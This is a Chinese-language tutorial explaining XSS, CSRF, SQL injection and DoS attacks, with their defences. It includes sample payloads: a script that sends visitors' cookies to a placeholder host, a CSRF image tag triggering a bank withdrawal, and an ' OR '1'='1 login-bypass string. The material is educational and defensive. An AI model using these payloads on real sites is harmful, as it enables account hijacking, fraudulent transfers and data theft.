

[TOC]

### Web 攻击技术

总结一下常见的 Web 攻击方法。

- **XSS攻击**（关键是脚本，利用恶意脚本发起攻击）
- **CSRF攻击**（关键是借助本地 cookie 进行认证，伪造发送请求）
- **SQL注入**（关键是通过用 SQL 语句伪造参数发出攻击）
- **DDOS攻击**（关键是发出大量请求，最后令服务器崩溃）

#### 跨站脚本攻击 XSS

##### 1. 概念

跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。从而达到攻击的目的，如盗取用户的 cookie，改变网页的 DOM 结构，重定向到其他网页等。

##### 2. 攻击原理

例如有一个论坛网站，攻击者可以在上面发布以下内容：

```html
<script>location.href="//domain.com/?c=" + document.cookie</script>
```

之后该内容可能会被渲染成以下形式：

```html
<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
```

另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。

##### 3. 危害

- 窃取用户的 Cookie
- 伪造虚假的输入表单骗取个人信息
- 显示伪造的文章或者图片

##### 4. 防范手段

答案很简单，**坚决不要相信用户的任何输入**，并过滤掉输入中的所有特殊字符。这样就能消灭绝大部分的XSS攻击。

###### ① 设置 Cookie 为 HttpOnly

设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。

###### ② 过滤特殊字符，进行转义处理

例如将 `<` 转义为 `&lt;`，将 `>` 转义为 `&gt;`，从而避免 HTML 和 Jascript 代码的运行。

富文本编辑器允许用户输入 HTML 代码，就不能简单地将 `<` 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。

富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。

以下例子中，form 和 script 等标签都被**转义**，而 h 和 p 等标签将会保留。

```html
<h1 id="title">XSS Demo</h1>

<p>123</p>

<form>
  <input type="text" name="q" value="test">
</form>

<pre>hello</pre>

<script type="text/javascript">
alert(/xss/);
</script>
```

```html
<h1>XSS Demo</h1>

<p>123</p>

&lt;form&gt;
  &lt;input type="text" name="q" value="test"&gt;
&lt;/form&gt;

<pre>hello</pre>

&lt;script type="text/javascript"&gt;
alert(/xss/);
&lt;/script&gt;
```

> [XSS 过滤在线测试](http://jsxss.com/zh/try.html)



#### 跨站请求伪造 CSRF

##### 1. 概念

跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去**访问一个自己曾经认证过的网站**并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。

由于浏览器**曾经认证**过，所以被访问的网站会认为是**真正**的用户操作而去执行。

**XSS 利用的是==用户==对指定==网站==的信任，CSRF 利用的是==网站==对用户==浏览器==的信任。**

##### 2. 攻击原理

假如一家银行用以执行转账操作的 URL 地址如下：

```
http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。
```

那么，一个恶意攻击者可以在另一个网站上放置如下代码：

```
<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
```

如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。

这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。

通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。

总结一下就是，要完成一次 CSRF 攻击，受害者必须依次完成两个步骤：

- 登录受**信任网站A**，并在本地**生成Cookie**。
- 在**不登出A**的情况下，访问**危险网站B**。

##### 3. 防范手段

###### ① 检查 Referer 首部字段

**Referer 首部字段**位于 HTTP 报文中，用于**标识请求来源**的地址。检查这个首部字段并要求**请求来源**的地址在**同一个域名**下，可以极大的防止 CSRF 攻击。

这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。

###### ② 添加校验 Token

在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。所以我们可以**采用 token（不存储于浏览器）认证**。

###### ③ 输入验证码

因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户**输入验证码**可以让用户知道自己正在做的操作。



#### SQL 注入攻击

##### 1. 概念

服务器上的数据库运行**非法的 SQL** 语句，主要通过**拼接**来完成。

##### 2. 攻击原理

例如一个网站登录验证的 SQL 查询代码为：

```sql
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```

如果填入以下内容：

```sql
userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";
```

那么 SQL 查询字符串为：

```sql
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
```

此时无需验证通过就能执行以下查询：

```sql
strSQL = "SELECT * FROM users;"
```

##### 3. 防范手段

###### ① 使用参数化查询

Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。

```java
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");
stmt.setString(1, userid);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

###### ② 单引号转换

将传入的参数中的单引号转换为**连续两个单引号**，PHP 中的 Magic quote 可以完成这个功能。



#### 拒绝服务攻击 DOS

##### 1. 概念

拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。

分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。

##### 2. 攻击方法

典型的 DOS 攻击方式如下：

- **SYN Flood** ： TCP 三次握手时，客户端服务器发出请求，请求建立连接，然后服务器返回一个报文，表明请求以被接受，然后客户端也会返回一个报文，最后建立连接。那么如果有这么一种情况，攻击者伪造 IP 地址，发出报文给服务器请求连接，这个时候服务器接受到了，根据 TCP 三次握手的规则，服务器也要回应一个报文，可是这个 **IP 是伪造的**，报文回应给谁呢，**第二次握手出现错误**，第三次自然也就不能顺利进行了，这个时候服务器收不到第三次握手时客户端发出的报文，又再**重复第二次握手**的操作。如果攻击者伪造了大量的 IP 地址并发出请求，这个时候服务器将维护一个非常大的**半连接**等待列表，占用了大量的资源，最后服务器瘫痪。
- **CC 攻击**，在应用层 HTTP 协议上发起攻击，模拟正常用户发送大量请求直到该**网站拒绝服务**为止。

##### 2. 预防

阿里巴巴的安全团队在实战中发现，DDoS 防御产品的核心是**检测技术和清洗技术**。检测技术就是检测网站是否正在遭受 DDoS 攻击，而清洗技术就是清洗掉异常流量。



#### 参考资料

- [维基百科：跨站脚本](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC)
- [维基百科：SQL 注入攻击](https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A)
- [维基百科：跨站点请求伪造](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
- https://blog.csdn.net/zhydream77/article/details/85694614